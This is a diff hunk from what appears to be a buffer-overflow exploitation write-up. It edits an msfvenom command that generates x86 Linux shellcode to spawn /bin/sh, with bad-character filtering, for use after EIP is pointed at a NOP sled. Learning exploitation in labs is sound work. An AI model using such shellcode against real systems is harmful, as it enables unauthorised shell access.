@@ -269,7 +269,7 @@ The only thing remaining is setting our EIP to an address that contains the \x90
 We use msfvenom once again to craft in hex the command we want to run
 
 ```bash
-msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
+msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
 ```
 
 Then we execute a payload I designed
